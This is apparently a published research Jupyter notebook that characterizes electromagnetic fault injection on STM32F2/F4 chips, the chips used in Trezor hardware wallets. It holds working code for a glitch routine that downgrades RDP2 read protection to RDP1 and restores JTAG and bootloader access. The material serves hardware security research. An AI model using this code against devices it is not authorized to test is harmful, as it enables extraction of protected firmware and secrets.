## 1_stm32_cnc_characterize

### STM32F2/F4 Fault Injection Characterization

Authors: [Joe Grand](https://joegrand.com) and [Lennert Wouters](https://x.com/lennertwo)

This notebook will run a fault injection campaign across the entire area of the target chip using a CNC platform and range of parameters. It will help us determine the ideal EMFI probe position and characteristics for our subsequent attacks. Depending on the intended attack type, different characterization options can be chosen.

Requires [ChipSHOUTER](https://www.newae.com/products/nae-cw520), [ChipWhisperer-Husky](https://www.newae.com/products/nae-cwhusky), [NewAE CW308 UFO Board](https://rtfm.newae.com/Targets/CW308%20UFO/), [Segger J-Link](https://www.segger.com/products/debug-probes/j-link/), [ChipShover](https://github.com/newaetech/ChipShover) or generic CNC milling machine w/ [GRBL](https://github.com/gnea/grbl) controller, and [STM32F2](https://www.st.com/en/microcontrollers-microprocessors/stm32f2-series.html) or [STM32F4](https://www.st.com/en/microcontrollers-microprocessors/stm32f4-series.html) with socket/adapter board.

Resources:

* [Main project page](https://grandideastudio.com/portfolio/security/stm32-fault-injection/)
* [GitHub repository](https://github.com/joegrand/stm32-fault-injection/)
* License: [GNU General Public License v3.0 or later](https://github.com/joegrand/stm32-fault-injection/blob/master/LICENSE.txt)

In [ ]:
import sys
import subprocess

import time
from datetime import datetime
from decimal import Decimal

import os
import struct

import numpy as np
from tqdm.notebook import tqdm
import matplotlib.pyplot as plt
from matplotlib.ticker import MaxNLocator, AutoMinorLocator, MultipleLocator
import random

import itertools  
from bokeh.plotting import figure, show
from bokeh.io import output_notebook, push_notebook, export_svgs
from bokeh.io.webdriver import webdriver_control
from bokeh.layouts import column
from bokeh.palettes import Dark2_5 as palette

from chipshouter import ChipSHOUTER
import chipwhisperer as cw

import pylink         # PyLink (Segger J-Link) + Add raw JTAG support (https://github.com/square/pylink/pull/86)
import serial         # https://github.com/pyserial/pyserial
from stmbl import *

## Global constants

In [ ]:
# Device type
#DEVICE = "STM32F205"
DEVICE = "STM32F427"

# Probe type
PROBE_SIZE = "4mm"
PROBE_WINDING = "CCW"

In [ ]:
# UART
PORT_CHIPSHOUTER = "/dev/tty.usbserial-NA4ZIWB5"   # ChipSHOUTER
PORT_CNC         = "/dev/tty.usbserial-14140"      # DoesBot GRBL CNC controller

# ChipSHOUTER
CS_COIL_VOLTAGE  = 450    # Volts
CS_PULSE_WIDTH   = 80     # nS (set later with scope.glitch.repeat)

In [ ]:
# Result types for glitch characterization loop
@enum.unique
class RESULT(enum.IntEnum):
    NORMAL        = 0    # Expected response
    FAULT         = 1    # Successful faults
    CRASH         = 2    # Crash
    RESET         = 3    # Reset
    WEIRD         = 4    # Weird
    WIPE          = 5    # Wipe
    PCROP         = 6    # PCROP enabled (SPRMOD bit set), STM32F4 only

# Define a mapping dictionary
result_to_legend = {
    RESULT.NORMAL:  "normal",
    RESULT.FAULT:   "fault",
    RESULT.CRASH:   "crash",
    RESULT.RESET:   "reset",
    RESULT.WEIRD:   "weird",
    RESULT.WIPE:    "wipe",
    RESULT.PCROP:   "pcrop",
}

# Function to get legend from result
def get_legend(result):
    try:
        return result_to_legend[result]
    except KeyError:
        raise ValueError("Unsupported data type.")

## Initial setup

### ChipWhisperer-Husky

In [ ]:
try:
    scope.dis()        # Ensure the ChipWhiserer is closed
except:
    pass
    
scope = cw.scope()     # Automatically detect and connect to ChipWhisperer
scope.default_setup()  # Set default configuration values

print("\nChipWhisperer Python Version:", cw.__version__)
print("ChipWhisperer Serial Number:", scope.sn)

In [ ]:
# ChipWhisperer and glitch configuration
def cw_init():
    scope.adc.clip_errors_disabled = True
    scope.adc.lo_gain_errors_disabled = True
    scope.errors.clear() 
    
    scope.clock.clkgen_src = "system"         # CLKGEN input clock (96MHz)
    
    scope.io.tio1 = "serial_rx"
    scope.io.tio2 = "serial_tx"
    scope.io.pdic = "high_z"
    
    scope.clock.adc_mul = 1
    scope.io.hs2 = "disabled"

    scope.clock.clkgen_freq = 100E6       # Clock speed 100MHz
    """
    if DEVICE.startswith("STM32F2"):
        scope.clock.clkgen_freq = 100E6       # Clock speed 100MHz
    
    elif DEVICE.startswith("STM32F4"):
        scope.clock.clkgen_freq = 200E6       # Clock speed 200MHz
    """
    scope.adc.basic_mode = "rising_edge"      # ADC capture trigger
    scope.adc.timeout = 0.3                   # Number of seconds to wait for trigger event before aborting capture
    scope.io.nrst = "high_z"                  # Ensure nRST is high-Z to not conflict with STM32

    scope.glitch.enabled = True
    
    scope.glitch.clk_src = "pll"              # Glitch input clock
    scope.glitch.trigger_src = "ext_single"   # Glitch only after scope.arm() called
    scope.glitch.output = "enable_only"       # Insert glitch for entire clock cycle
    scope.io.glitch_trig_mcx = "glitch"       # Output positive-going glitch pulse on MCX connector
    
    scope.glitch.repeat = 9                   # Width of glitch pulse (in cycles)

In [ ]:
cw_init()

### CNC Platform

Adjust the Z axis so the probe is as close as possible to the target chip while still being able to move it. A piece of paper should be able to slide between the probe and target chip. The voltage required for a successful fault is directly related to the probe height above the target chip, but may affect other parameters as well.

#### Generic 3018 Pro-Max

Position the ChipSHOUTER probe over the target chip at the back left corner [0, 0]

**Ensure external remote is disconnected and RST on controller has been pressed.**

In [ ]:
# Initialize CNC controller
global cnc
CNC_TYPE = "Generic"

try:
    cnc.close()   # Ensure the port is closed
except NameError:
    pass
except serial.SerialException:
    pass

cnc = serial.Serial(
          port = PORT_CNC,
          baudrate = 115200,
          parity = serial.PARITY_NONE,
          stopbits = serial.STOPBITS_ONE,
          bytesize = serial.EIGHTBITS,
          timeout = 1
      )
        
time.sleep(3)                            # Wait for the controller to initialize
print(cnc.read_all().decode().strip())   # Read Grbl initialization string

In [ ]:
# Send a command to the CNC and wait for an 'ok' response
def cnc_send_command(command):
    try:
        cnc.write((command + '\n').encode())   # Send the command
        cnc.flush()                            # Ensure it's transmitted
        #print(f"Sent: {command}")
       
        response = cnc.readline().decode().strip()   # Read response from the CNC
        #print(f"Received: {response}")
            
        if response == 'ok':
            return True
        elif 'error' in response:
            print(f"Error: {response}")
            return False

    except serial.SerialException as e:
        print(f"Serial Error: {e}")
        return False

In [ ]:
cnc_send_command("G21")                  # Set units to millimeters
cnc_send_command("G94")                  # Set feed rate to units per minute
cnc_send_command("G10 L2 P1 X0 Y0 Z0")   # Set current CNC position as zero/origin
cnc_send_command("G54")                  # Activate the Work Coordinate System
cnc_send_command("G90")                  # Set absolute positioning mode
    
# All subsequent G0 or G1 commands sent to the CNC are absolute coordinates relative to the defined origin
# Example: "G1 X0.1 Y0.1 F100" will move (+0.1, +0.1) in mm at a feed rate of 100mm/min

In [ ]:
cnc_send_command("G1 X5.0 Y5.0 Z0 F100")   # Set probe position (optional)

In [ ]:
cnc_send_command("G1 X0.0 Y0.8 Z0 F100")   # CW/CCW probe adjustment (optional)

In [ ]:
cnc_send_command("G1 X-2.1 Y-7.0 Z0 F100")   # F2/F4 probe adjustment (optional)

In [ ]:
cnc_send_command("G1 X0.0 Y0.0 Z0 F100")     # Return to zero

#### ChipShover

In [ ]:
# Initialize ChipShover
from chipshover import ChipShover

CNC_TYPE = "Shover"

PORT_SHOVER = "/dev/tty.usbserial-1140"

shv = ChipShover(PORT_SHOVER)
shv.home()

### ChipSHOUTER

In [ ]:
try:
    if cs.status() == True:
        cs.disconnect()
except NameError:
    pass

cs = ChipSHOUTER(PORT_CHIPSHOUTER)

In [ ]:
def cs_init():
    cs.reset = True                  # Force hardware reset to clear any faults
    cs.absent_temp = 15              # Maximum allowable time without checking temperature sensors

    time.sleep(0.5)

    cs.hwtrig_mode = True            # Trigger polarity active-high
    cs.hwtrig_term = False           # External SMB hardware trigger as high-Z
    cs.pat_enable = False            # Disable pattern trigger

    cs.voltage = CS_COIL_VOLTAGE     # Output/coil voltage level (glitch quality is also dependent on Z height to target)
    cs.pulse.repeat = 1              # Single pulse per trigger

In [ ]:
cs_init()

In [ ]:
def arm_cs(voltage):
    cs.absent_temp = 15
    cs.faults_current = False
    cs.voltage = voltage

    if cs.state != 'armed':
        cs.armed = False
        time.sleep(1)
        cs.armed = True
        time.sleep(2)

In [ ]:
def cs_reconnect():
    while True:
        try:
            cs_init()
            break
        except OSError as e:
            if "No response from shouter" in str(e):
                print("No response from shouter, retrying...")
                time.sleep(1)
            else:
                raise  # unexpected OSError

### Segger J-Link

In [ ]:
# https://pylink.readthedocs.io/en/latest/
jlink = pylink.JLink()

if jlink.opened() == False:
    jlink.open()

jlink.set_tif(pylink.enums.JLinkInterfaces.JTAG)   # Set Target Interface as JTAG

print(jlink.product_name)

In [ ]:
# Retrieve IDCODE via low-level JTAG SHIFTDR, does not connect to target
def pylink_idcode():
    jlink.open()
    jlink.set_tif(pylink.enums.JLinkInterfaces.JTAG)   # Set Target Interface as JTAG
    jlink.jtag_raw_rw([0], [0x1F], 5)         # JTAG Reset (TMS = 1 for 5 bits)
    jlink.jtag_raw_rw([0], [0x02], 4)         # JTAG ID read (IDCODE should be in DR upon TAP reset)
    result = jlink.jtag_raw_rw([0]*8, [0]*8)  # Shift to see what's on scan chain
    hex_id = hex(struct.unpack("<I", bytes(result[0:4]))[0])    
    return(hex_id)

In [ ]:
print(pylink_idcode())

## Glitch Characterization

In [ ]:
def sca_plot_traces(traces, title, mean_only = False):
    output_notebook()
    p = figure(sizing_mode='scale_width', height=500, width=1500)
    p.xaxis.formatter.use_scientific = False
    
    x_range = list(range(0, traces.shape[1]))
    colors = itertools.cycle(palette) 

    if mean_only == False:
        # Plot each trace up to range(x)
        for i, color in zip(range(5), colors):
            p.line(x_range, traces[i], color=color, legend_label=str(i))
    
    # Plot the mean
    p.line(x_range, np.mean(traces, axis=0), color='blue', legend_label='mean')
        
    p.legend.click_policy="hide"
    p.title.text = title + f" ({scope.clock.clkgen_freq / 1e6:.0f} MHz)"  # Dynamically set the title

    # Save the plot
    p.output_backend = "svg"
    export_svgs(p, filename=f'./output/{title}.svg')

    # Display the plot
    p.output_backend = "canvas"
    show(p)

    # Reset the Bokeh WebDriver to clear resources
    webdriver_control.reset()

In [ ]:
def stm32_pwr_cycle(arm = False):
    scope.io.target_pwr = False     # Power off target via CW +3.3V
    time.sleep(0.075)
    if (arm): scope.arm()           # Arm the ADC, wait for trigger
    scope.io.target_pwr = True      # Power on target via CW +3.3V

### STM32 Serial Bootloader

In [ ]:
def checksum(data):
    if type(data) == int or len(data) == 1:
        if data < 0 or data > 255:
            raise ValueError('Checksum input error:', data)
        return 0xff-data
    else:
        chk = 0
        for d in data:
            chk ^= d
        return chk & 0xff

In [ ]:
def reconnect(delay=0.15):
    scope.io.nrst = False
    time.sleep(0.05)
    scope.io.pdic = True    # Set BOOT0 HIGH to enter STM32 serial bootloader
    scope.io.nrst = True
    time.sleep(delay)
    scope.io.pdic = False

    stbl.connect()

In [ ]:
def bl_connect_retry(n=5):
    for i in range(n):
        try:
            reconnect()
            return
        except:
            time.sleep(0.2*n)
            continue
    raise ValueError

In [ ]:
scope.scopetype.usart.init(115200, stopbits=1, parity="even")
stbl = StmBl(scope.scopetype.usart, debug=False)

In [ ]:
stm32_pwr_cycle(False)    # Power cycle target

In [ ]:
reconnect()               # Connect to STM32 Serial Bootloader

In [ ]:
a, b, c = stbl.get_version()
print('Version: 0x%02x, option 1: %d, option 2: %d' %(a,b,c))
#a, b, c = stbl.get()

### Option 1: Test Code

Requires `stm32f2_tests.bin` or `stm32f4_tests.bin` to be programmed into the target chip

In [ ]:
# Configure ChipWhisperer trigger
cw_init()

scope.adc.basic_mode = "rising_edge"   

scope.trigger.module = "basic"         # Trigger on a logic level or edge
scope.trigger.triggers = "tio4"        # Trigger on TIO4

In [ ]:
def reset_dut(delay = 0.05):
    scope.io.nrst = 'high_z'
    scope.io.pdic = False          # Set BOOT0 LOW to run user code
    scope.io.target_pwr = False    # Power off target via CW +3.3V
    time.sleep(delay)
    scope.io.target_pwr = True     # Power on target via CW +3.3V
    time.sleep(0.05)

In [ ]:
def reset_dut_thorough():
    d = 0
    reset_dut()
    r = bytes(scope.scopetype.usart.read())
    
    while b'Hello!\n' not in r:
        d += 0.5
        reset_dut(d)
        time.sleep(0.1)
        r = bytes(scope.scopetype.usart.read())

In [ ]:
# Unprotect the target if it is currently set to RDP Level 1
reconnect()
stbl.readout_unprotect()

In [ ]:
# Erase memory so we can load new code
reconnect()
stbl.extended_erase_memory(fullerase=True)

In [ ]:
reset_dut()

In [ ]:
# Set Option Bytes

# RDP = 0xAA (Level 0)
# User Option Byte = 0xEF = 0b11101111
# Bit 7: nRST_STDBY = 1 (No reset generated)
# Bit 6: nRST_STOP = 1 (No reset generated)
# Bit 5: WDG_SW = 1 (Software watchdog)
# Bit 4: BFB2 = 0 (Boot depending on BOOT pin state for STM32F427, unused for STM32F205)
# Bit 3:2: BOR_LEV = 11 (Brown out reset disabled)
# Bit 1:0: Not used = 11

option_bytes_level0 = bytearray.fromhex('EFAA1055')
reconnect()
stbl.write_memory(0x1FFFC000, option_bytes_level0)

In [ ]:
if DEVICE.startswith("STM32F2"):
    with open('./bin/stm32f2_tests.bin', 'rb') as f:
        fw = bytearray(f.read())

elif DEVICE.startswith("STM32F4"):
    with open('./bin/stm32f4_tests.bin', 'rb') as f:
        fw = bytearray(f.read())

else:
    raise ValueError("Unsupported device type.")

In [ ]:
reconnect()
if len(fw) < 256:
    stbl.write_memory(0x08000000, fw)
else:
    stbl.write_range(0x08000000, fw)

In [ ]:
if len(fw) < 256:
    data = stbl.read_memory(0x08000000, len(fw))
else:
    data = stbl.read_range(0x08000000, len(fw))

In [ ]:
data == fw

In [ ]:
reset_dut()

In [ ]:
r = scope.scopetype.usart.read()
print(bytes(r))
scope.scopetype.usart.write(b'D')
time.sleep(0.05)
r = scope.scopetype.usart.read()
print(bytes(r))

In [ ]:
def test_fw_read(address):
    scope.scopetype.usart.flush()
    reset_dut()

    r1 = scope.scopetype.usart.read()
    scope.scopetype.usart.write(b'B')
    scope.scopetype.usart.write(address.to_bytes(4, 'big'))
    time.sleep(0.1)
    r2 = scope.scopetype.usart.read()

    return [r1, r2.hex()]

In [ ]:
test_fw_read(0x08000000)

In [ ]:
test_fw_read(0x1FFFC000)

In [ ]:
def test_pcrop_read():  # Return Option Bytes (0x1FFFC008, 0x1FFEC008), FLASH_OPTCR (0x40023C14) and FLASH_OPTCR1 (0x40023C18)
    scope.scopetype.usart.flush()
    reset_dut()

    r1 = scope.scopetype.usart.read()
    scope.scopetype.usart.write(b'P')
    time.sleep(0.01)
    r2 = scope.scopetype.usart.read()

    return [r1, len(r2), r2[0:4].hex(), r2[4:8].hex(), r2[8:12].hex(), r2[12:16].hex()]

In [ ]:
test_pcrop_read()

In [ ]:
def reprogram():
    global stbl

    cs.mute = True

    try: 
        cs.armed = False
    except Exception:
        pass

    bl_connect_retry()
    stbl.readout_unprotect()
    bl_connect_retry()

    bl_connect_retry()
    stbl.extended_erase_memory(fullerase=True)
    bl_connect_retry()

    if DEVICE.startswith("STM32F2"):
        with open('./bin/stm32f2_tests.bin', 'rb') as f:
            fw = bytearray(f.read())
    
    elif DEVICE.startswith("STM32F4"):
        with open('./bin/stm32f4_tests.bin', 'rb') as f:
            fw = bytearray(f.read())

    if len(fw) < 256:
        stbl.write_memory(0x08000000, fw)
    else:
        stbl.write_range(0x08000000, fw)

    if len(fw) < 256:
        data = stbl.read_memory(0x08000000, len(fw))
    else:
        data = stbl.read_range(0x08000000, len(fw))
    print('Programming successful:', data==fw)

    option_bytes_level1 = bytearray.fromhex('EFBB1044')
    bl_connect_retry()
    stbl.write_memory(0x1FFFC000, option_bytes_level1)

    reset_dut()
    
    try: 
        cs.armed = True
        time.sleep(2)
    except Exception:
        pass

    #cs.mute = False

In [ ]:
def reprogram_rdp2():
    global stbl

    cs.mute = True

    try: 
        cs.armed = False
    except Exception:
        pass

    bl_connect_retry()
    stbl.readout_unprotect()
    bl_connect_retry()

    bl_connect_retry()
    stbl.extended_erase_memory(fullerase=True)
    bl_connect_retry()
    
    if DEVICE.startswith("STM32F2"):
        with open('./bin/stm32f2_tests.bin', 'rb') as f:
            fw = bytearray(f.read())
    
    elif DEVICE.startswith("STM32F4"):
        with open('./bin/stm32f4_tests.bin', 'rb') as f:
            fw = bytearray(f.read())

    if len(fw) < 256:
        stbl.write_memory(0x08000000, fw)
    else:
        stbl.write_range(0x08000000, fw)

    if len(fw) < 256:
        data = stbl.read_memory(0x08000000, len(fw))
    else:
        data = stbl.read_range(0x08000000, len(fw))
    print('Programming successful:', data==fw)
   
    # Write default values
    option_bytes1 = bytearray.fromhex('C0003FFF')  # Option Bytes
    bl_connect_retry()    
    stbl.write_memory(0x1FFFC008, option_bytes1)

    option_bytes2 = bytearray.fromhex('0000FFFF')  # Option Bytes
    bl_connect_retry()    
    stbl.write_memory(0x1FFEC008, option_bytes2)
    
    option_bytes_level2 = bytearray.fromhex('EFCC1033')
    bl_connect_retry()
    stbl.write_memory(0x1FFFC000, option_bytes_level2)
    
    reset_dut()
    
    try: 
        cs.armed = True
        time.sleep(2)
    except Exception:
        pass
    
    #cs.mute = False

#### Enable RDP Level 1

Configure Option Bytes accordingly in order to enable Read Protection (RDP)

* 0xAA: Level 0, no protection
* 0xCC: Level 2, chip protection (debug and boot from RAM features disabled)
* Others: Level 1, read protection of memories (debug features limited)

Trezor Model One (STM32F205): Table 7 of PM0059 STM32F2xx Flash Programming Manual  
Trezor Model T (STM32F427): Table 17 of RM0090 STM32F4xx Reference Manual

In [ ]:
# RDP = 0xBB (Level 1)
# User Option Byte = 0xEF = 0b11101111
# Bit 7: nRST_STDBY = 1 (No reset generated)
# Bit 6: nRST_STOP = 1 (No reset generated)
# Bit 5: WDG_SW = 1 (Software watchdog)
# Bit 4: BFB2 = 0 (Boot depending on BOOT pin state for STM32F427, unused for STM32F205)
# Bit 3:2: BOR_LEV = 11 (Brown out reset disabled)
# Bit 1:0: Not used = 11

option_bytes_level1 = bytearray.fromhex('EFBB1044')
reconnect()
stbl.write_memory(0x1FFFC000, option_bytes_level1)

In [ ]:
# If RDP1 is successfully enabled, we should receive a NackException when accessing Flash memory
reconnect()
print(stbl.read_memory(0x08000000).hex())

#### Enable RDP Level 2 (USE WITH CAUTION)

In [ ]:
# RDP = 0xCC (Level 2)
# User Option Byte = 0xEF = 0b11101111
# Bit 7: nRST_STDBY = 1 (No reset generated)
# Bit 6: nRST_STOP = 1 (No reset generated)
# Bit 5: WDG_SW = 1 (Software watchdog)
# Bit 4: BFB2 = 0 (Boot depending on BOOT pin state for STM32F427, unused for STM32F205)
# Bit 3:2: BOR_LEV = 11 (Brown out reset disabled)
# Bit 1:0: Not used = 11

option_bytes_level2 = bytearray.fromhex('EFCC1033')
reconnect()
stbl.write_memory(0x1FFFC000, option_bytes_level2)

In [ ]:
stm32_pwr_cycle(False)     # Power cycle target

In [ ]:
# If RDP2 is successfully enabled, we should not be able to connect to the serial bootloader anymore
reconnect()

### Option 2: RDP2 -> RDP1 Downgrade

With successful fault injection of the STM32 during power-up, RDP2 will be downgraded to RDP1. This enables JTAG/SWD, bootloader, and access to RAM.

In [ ]:
def sca_measurement_loop_rdp():  
    scope.io.target_pwr = True        # Power on target via CW +3.3V
    time.sleep(0.5)
    
    ntraces = 10
    traces = np.zeros((ntraces, scope.adc.samples), dtype='uint8')
    
    for i in tqdm(range(ntraces)):
        stm32_pwr_cycle(True)                            # Power cycle target and arm ChipWhisperer
        scope.capture(poll_done=True)                    # Capture trace
        traces[i] = scope.get_last_trace(as_int=True)    # Store captured trace into array
        
    scope.io.target_pwr = False       # Power off target via CW +3.3V

    return traces

#### nRST trigger

In [ ]:
# ChipWhisperer SCA parameters for reference capture
cw_init()

scope.trigger.module = "basic"        # Trigger on a logic level or edge
scope.trigger.triggers = "nrst"       # Trigger on nRST

scope.gain.db = 27
scope.adc.bits_per_sample = 8
scope.adc.offset = 0                  # Number of samples to skip before recording data after trigger event
scope.adc.presamples = 0              # Number of samples to record from before the trigger event

scope.adc.samples = 40000             # Number of ADC samples to record in a single capture (maximum 131070)
"""
if DEVICE.startswith("STM32F2"):
    scope.adc.samples = 40000         # Number of ADC samples to record in a single capture (maximum 131070)

elif DEVICE.startswith("STM32F4"):
    scope.adc.samples = 80000         # Number of ADC samples to record in a single capture (maximum 131070)
"""

In [ ]:
traces_nrst = sca_measurement_loop_rdp()

In [ ]:
sca_plot_traces(traces_nrst, title = f"{DEVICE} Downgrade Reference Trace (NRST Trigger)", mean_only = False)

In [ ]:
# Save traces (optional)
np.save(f'./output/{DEVICE.lower()}_rdp_reference_sca_nrst.npy', traces_nrst)

In [ ]:
# Load traces (optional)
traces_nrst = np.load(f'./output/{DEVICE.lower()}_rdp_reference_sca_nrst.npy')

#### SAD trigger

In [ ]:
# Configure ChipWhisperer SAD (Sum of Absolute Differences)
cw_init()

SAD_TRACE_OFFSET = X     # Start of reference trace, value needs to be determined through characterization

sad_downgrade_pattern = traces_nrst[0][SAD_TRACE_OFFSET:SAD_TRACE_OFFSET+200]

scope.trigger.module = 'SAD'
scope.SAD.reference = sad_downgrade_pattern
scope.SAD.interval_threshold = 30
scope.SAD.threshold = 64
scope.SAD.multiple_triggers = False
scope.SAD.emode = False

scope.gain.db = 27
scope.adc.bits_per_sample = 8
scope.adc.offset = 0                  # Number of samples to skip before recording data after trigger event
scope.adc.presamples = 500            # Number of samples to record from before the trigger event

if DEVICE.startswith("STM32F2"):
    scope.adc.samples = 1750          # Number of ADC samples to record in a single capture (maximum 131070)

elif DEVICE.startswith("STM32F4"):
    scope.adc.samples = 2500          # Number of ADC samples to record in a single capture (maximum 131070)

In [ ]:
traces_sad = sca_measurement_loop_rdp()

In [ ]:
sca_plot_traces(traces_sad, title = f"{DEVICE} Downgrade Reference Trace (SAD Trigger)", mean_only = False)

### Option 3: STM32 Serial Bootloader Command

This test requires that the target device is in RDP1.

In [ ]:
def send_bl_command():
    cmd_value = int(stbl.Command.READ_MEMORY)
    
    scope.scopetype.usart.write(bytes([cmd_value]))
    scope.arm()
    scope.scopetype.usart.write(bytes([checksum(cmd_value)]))

In [ ]:
def sca_measurement_loop_bl():  
    cs.armed = False

    ntraces = 10
    traces = np.zeros((ntraces, scope.adc.samples), dtype='uint8')  # Integer for SAD
    #traces = np.zeros((ntraces, scope.adc.samples), dtype='float32')  # Floating point for ADC

    ret = scope.scopetype.usart.read()
    reconnect()
    ret = scope.scopetype.usart.read()

    #for i in tqdm(range(ntraces), disable=True):
    for i in tqdm(range(ntraces)):
        reconnect()
        send_bl_command()
        
        time.sleep(0.05)
        ret = scope.scopetype.usart.read()
        print(bytes(ret))
        
        scope.capture(poll_done=True)                    # Capture trace
        traces[i] = scope.get_last_trace(as_int=True)    # Store captured trace into array (integer for SAD)
        #traces[i] = scope.get_last_trace(as_int=False)    # Store captured trace into array (floating point for ADC)

    return traces

#### Edge trigger

In [ ]:
scope.scopetype.usart.init(115200, stopbits=1, parity="even")
stbl = StmBl(scope.scopetype.usart, debug=False)
reconnect()

In [ ]:
# ChipWhisperer SCA parameters for reference capture
cw_init()

scope.gain.db = 27
scope.adc.samples = 30000
scope.adc.presamples = 1000
scope.adc.bits_per_sample = 8

scope.io.glitch_trig_mcx = 'trigger'
scope.trigger.module = 'edge_counter'
scope.trigger.triggers = 'tio2'  # serial_tx

# STM32 serial bootloader @ 8 data bits, even parity, 1 stop bit
scope.trigger.edges = 6      # READ_MEMORY (0x11)

In [ ]:
traces_edge = sca_measurement_loop_bl()

In [ ]:
sca_plot_traces(traces_edge, title = f"{DEVICE} BL Read Reference Trace (Edge Trigger)", mean_only = False)

In [ ]:
# Save traces (optional)
np.save(f'./output/{DEVICE.lower()}_bl_read_reference_sca_edge.npy', traces_edge)

In [ ]:
# Load traces (optional)
traces_edge = np.load(f'./output/{DEVICE.lower()}_bl_read_reference_sca_edge.npy')

#### Option 1: SAD trigger

In [ ]:
# Configure ChipWhisperer SAD (Sum of Absolute Differences)

SAD_TRACE_OFFSET = X     # End of reference trace, value needs to be determined through characterization

sad_bl_pattern = traces_edge[0][SAD_TRACE_OFFSET - scope.SAD.sad_reference_length:]

scope.io.glitch_trig_mcx = 'trigger'
scope.trigger.module = 'SAD'
scope.SAD.reference = sad_bl_pattern
scope.SAD.interval_threshold = 15
scope.SAD.threshold = 15
scope.SAD.multiple_triggers = False
scope.SAD.emode = False

scope.adc.samples = 1000         # Number of ADC samples to record in a single capture (maximum 131070)
scope.adc.presamples = 200
scope.adc.bits_per_sample = 8

In [ ]:
traces_sad = sca_measurement_loop_bl()

In [ ]:
sca_plot_traces(traces_sad, title = f"{DEVICE} BL Read Reference Trace (SAD Trigger)", mean_only = False)

#### Option 2: ADC level trigger

In [ ]:
# Configure ChipWhisperer ADC (Analog-to-Digital Converter)
scope.io.glitch_trig_mcx = 'trigger'
scope.trigger.module = 'ADC'
scope.trigger.level = X    # Set this value to a discernible voltage level (based on the above plot) that will serve as our trigger

scope.adc.samples = 1000
scope.adc.presamples = 200

In [ ]:
traces_adc = sca_measurement_loop_bl()

In [ ]:
sca_plot_traces(traces_adc, title = f"{DEVICE} BL Read Reference Trace (ADC Trigger)", mean_only = False)

### Configuration

In [ ]:
def downgrade():
    # Hard-code position for F4 based on previous test results
    if DEVICE.startswith("STM32F4"):
        cnc_downgrade_x = 8.5
        cnc_downgrade_y = 9.0
            
    if POSITION_TYPE == "Automatic":
        cnc_send_command(f"G1 X{cnc_downgrade_x} Y{cnc_downgrade_y} Z0 F100")
        time.sleep(2)  # Wait for CNC to finish move

    scope.trigger.module = 'SAD'
    scope.SAD.reference = sad_downgrade_pattern

    scope.glitch.ext_offset = downgrade_offset
    scope.glitch.repeat = downgrade_width

    arm_cs(downgrade_voltage)
    
    scope.io.nrst = 'high_z'

    #for i in range(100):
    for i in tqdm(range(100), desc=f"Attempting downgrade at {downgrade_voltage}V"):
        r = cs.trigger_safe            
        scope.io.pdic = True            # Set BOOT0 HIGH to enter STM32 Serial Bootloader
        stm32_pwr_cycle(True)           # Power cycle target and arm ChipWhisperer
        scope.capture(poll_done=True)   # Capture trace
        time.sleep(0.05)                # Allow target time to initialize

        id = pylink_idcode()            # Attempt to read JTAG IDCODE                
        if (id != '0xffffffff' and id != '0x0'):
            print("JTAG IDCODE: " + id, end="\r\n")
            #break
        
        try:
            reconnect()

        except:
            continue

        else:
            print(f"Successful downgrade using {downgrade_voltage}V at offset {downgrade_offset}")
            break
    
    cs.armed = False

    if POSITION_TYPE == "Automatic":
        cnc_send_command(f"G1 X{x_coord} Y{y_coord} Z0 F100")
        time.sleep(2)  # Wait for CNC to finish move

In [ ]:
scope.io.glitch_trig_mcx = 'glitch'
scope.glitch.repeat = 9

In [ ]:
# Glitch characterization: Number of tries per voltage setting per position
GLITCH_TRIES = 10

In [ ]:
# Positioning type, can be "Manual" or "Automatic"
POSITION_TYPE = "Automatic"

In [ ]:
# Scan type, can be "Test", "RDP_JTAG", "RDP_BL", or "BL"
SCAN_TYPE = "RDP_JTAG"

In [ ]:
# Customized parameters (STM32F2)
if DEVICE.startswith("STM32F2"):  # 100MHz
    if SCAN_TYPE == "Test":
        glitch_voltage_start = 450
        glitch_voltage_end = 450
        
        glitch_width_start = 9
        glitch_width_end = 9
        
        glitch_offset_start = 1000
        glitch_offset_end = 2000
    
    elif SCAN_TYPE == "RDP_JTAG" or SCAN_TYPE == "RDP_BL":
        glitch_voltage_start = 400
        glitch_voltage_end = 500
        
        glitch_width_start = 10
        glitch_width_end = 10
        
        glitch_offset_start = 0
        glitch_offset_end = 200
    
    elif SCAN_TYPE == "BL":
        glitch_voltage_start = 300
        glitch_voltage_end = 350
        
        glitch_width_start = 11
        glitch_width_end = 11
        
        glitch_offset_start = 0
        glitch_offset_end = 200
    
        nbytes = 256     # Number of bytes to read (up to 256 bytes allowed)
        address = 0x08000000   # Flash
    
        addr = address.to_bytes(4, 'big')
        addr = addr + bytearray([checksum(addr)])
    else:
        raise ValueError("Unsupported scan type.")
else:
    raise ValueError("Incorrect chip type.")

In [ ]:
# Customized parameters (STM32F4)
if DEVICE.startswith("STM32F4"):  # 200MHz
    if SCAN_TYPE == "Test":
        glitch_voltage_start = 450
        glitch_voltage_end = 450
        
        glitch_width_start = 18
        glitch_width_end = 18
        
        glitch_offset_start = 2000
        glitch_offset_end = 4000
    
    elif SCAN_TYPE == "RDP_JTAG" or SCAN_TYPE == "RDP_BL":
        glitch_voltage_start = 300
        glitch_voltage_end = 500
        
        glitch_width_start = 22
        glitch_width_end = 40
        
        glitch_offset_start = 0
        glitch_offset_end = 400
    
    elif SCAN_TYPE == "BL":
        glitch_voltage_start = 300
        glitch_voltage_end = 500
        
        glitch_width_start = 16
        glitch_width_end = 30
        
        glitch_offset_start = 0
        glitch_offset_end = 400
        
        nbytes = 256     # Number of bytes to read (up to 256 bytes allowed)
        address = 0x08000000   # Flash
    
        addr = address.to_bytes(4, 'big')
        addr = addr + bytearray([checksum(addr)])
    else:
        raise ValueError("Unsupported scan type.")
else:
    raise ValueError("Incorrect chip type.")

In [ ]:
# CNC Range (Relative to zero position)
if DEVICE.startswith("STM32F2"):     # Trezor One: STM32F205RET6/RGT6 (LQFP64, 10 x 10mm)
    PACKAGE_X   = 9.0
    PACKAGE_Y   = 9.0
    
    CNC_X_MIN   = 0.0
    CNC_X_MAX   = PACKAGE_X
    CNC_Y_MIN   = 0.0
    CNC_Y_MAX   = PACKAGE_Y
    CNC_STEP    = 0.5

elif DEVICE.startswith("STM32F4"):   # Trezor Model T: STM32F427VIT6 (LQFP100, 14 x 14mm)
    PACKAGE_X   = 13.0
    PACKAGE_Y   = 13.0

    CNC_X_MIN   = 0.0
    CNC_X_MAX   = PACKAGE_X
    CNC_Y_MIN   = 0.0
    CNC_Y_MAX   = PACKAGE_Y
    CNC_STEP    = 0.5

else:
    raise ValueError("Unsupported device type.")

